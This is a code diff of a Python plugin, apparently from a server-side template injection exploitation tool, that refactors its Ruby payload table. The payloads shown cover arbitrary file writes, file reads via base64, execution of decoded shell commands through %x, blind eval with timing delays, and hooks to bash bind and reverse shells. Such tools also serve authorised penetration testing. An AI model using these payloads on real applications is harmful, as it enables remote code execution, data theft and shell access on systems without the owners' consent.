@@ -7,75 +7,77 @@ import base64
 import re
 
 class Ruby(Plugin):
+    
+    def language_init(self):
 
-    actions = {
-        'render' : {
-            'render': '"#{%(code)s}"',
-            'header': """'%(header)s'+""",
-            'trailer': """+'%(trailer)s'""",
-            'render_test': """%(s1)i*%(s2)i""" % { 
-                's1' : rand.randints[0], 
-                's2' : rand.randints[1]
+        self.update_actions({
+            'render' : {
+                'render': '"#{%(code)s}"',
+                'header': """'%(header)s'+""",
+                'trailer': """+'%(trailer)s'""",
+                'render_test': """%(s1)i*%(s2)i""" % { 
+                    's1' : rand.randints[0], 
+                    's2' : rand.randints[1]
+                },
+                'render_expected': '%(res)s' % { 
+                    'res' : rand.randints[0]*rand.randints[1]
+                }
             },
-            'render_expected': '%(res)s' % { 
-                'res' : rand.randints[0]*rand.randints[1]
-            }
-        },
-        'write' : {
-            'call' : 'inject',
-            'write': """require'base64';File.open('%(path)s', 'ab+') {|f| f.write(Base64.urlsafe_decode64('%(chunk_b64)s')) }""",
-            'truncate' : """File.truncate('%(path)s', 0)"""
-        },
-        'read' : {
-            'call': 'evaluate',
-            'read': """(require'base64';Base64.encode64(File.binread("%(path)s"))).to_s""",
-        },
-        'md5' : {
-            'call': 'evaluate',
-            'md5': """(require'digest';Digest::MD5.file("%(path)s")).to_s"""
-        },
-        'evaluate' : {
-            'call': 'render',
-            'evaluate': """%(code)s"""
-        },
-        'execute' : {
-            'call': 'evaluate',
-            'execute': """(require'base64';%%x(#{Base64.urlsafe_decode64('%(code_b64)s')})).to_s"""
-        },
-        'blind' : {
-            'call': 'evaluate_blind',
-            'bool_true' : """1.to_s=='1'""",
-            'bool_false' : """1.to_s=='2'"""
-        },
-        'evaluate_blind' : {
-            'call': 'inject',
-            'evaluate_blind': """require'base64';eval(Base64.urlsafe_decode64('%(code_b64)s'))&&sleep(%(delay)i)"""
-        },
-        'bind_shell' : {
-            'call' : 'execute_blind',
-            'bind_shell': languages.bash_bind_shell
-        },
-        'reverse_shell' : {
-            'call': 'execute_blind',
-            'reverse_shell' : languages.bash_reverse_shell
-        },
-        'execute_blind' : {
-            'call': 'inject',
-            'execute_blind': """require'base64';%%x(#{Base64.urlsafe_decode64('%(code_b64)s')+' && sleep %(delay)i'})"""
-        },
-    }
+            'write' : {
+                'call' : 'inject',
+                'write': """require'base64';File.open('%(path)s', 'ab+') {|f| f.write(Base64.urlsafe_decode64('%(chunk_b64)s')) }""",
+                'truncate' : """File.truncate('%(path)s', 0)"""
+            },
+            'read' : {
+                'call': 'evaluate',
+                'read': """(require'base64';Base64.encode64(File.binread("%(path)s"))).to_s""",
+            },
+            'md5' : {
+                'call': 'evaluate',
+                'md5': """(require'digest';Digest::MD5.file("%(path)s")).to_s"""
+            },
+            'evaluate' : {
+                'call': 'render',
+                'evaluate': """%(code)s"""
+            },
+            'execute' : {
+                'call': 'evaluate',
+                'execute': """(require'base64';%%x(#{Base64.urlsafe_decode64('%(code_b64)s')})).to_s"""
+            },
+            'blind' : {
+                'call': 'evaluate_blind',
+                'bool_true' : """1.to_s=='1'""",
+                'bool_false' : """1.to_s=='2'"""
+            },
+            'evaluate_blind' : {
+                'call': 'inject',
+                'evaluate_blind': """require'base64';eval(Base64.urlsafe_decode64('%(code_b64)s'))&&sleep(%(delay)i)"""
+            },
+            'bind_shell' : {
+                'call' : 'execute_blind',
+                'bind_shell': languages.bash_bind_shell
+            },
+            'reverse_shell' : {
+                'call': 'execute_blind',
+                'reverse_shell' : languages.bash_reverse_shell
+            },
+            'execute_blind' : {
+                'call': 'inject',
+                'execute_blind': """require'base64';%%x(#{Base64.urlsafe_decode64('%(code_b64)s')+' && sleep %(delay)i'})"""
+            },
+        })
 
-    contexts = [
+        self.set_contexts([
 
-        # Text context, no closures
-        { 'level': 0 },
-        
-        # Code context escape with eval() injection is not easy, since eval is used to evaluate a single 
-        # dynamically generated Python expression e.g. eval("""1;print 1"""); would fail. 
-        
-        # TODO: the plugin should support the exec() injections, which can be assisted by code context escape
+            # Text context, no closures
+            { 'level': 0 },
+            
+            # Code context escape with eval() injection is not easy, since eval is used to evaluate a single 
+            # dynamically generated Python expression e.g. eval("""1;print 1"""); would fail. 
+            
+            # TODO: the plugin should support the exec() injections, which can be assisted by code context escape
 
-    ]
+        ])
 
     language = 'ruby'
 
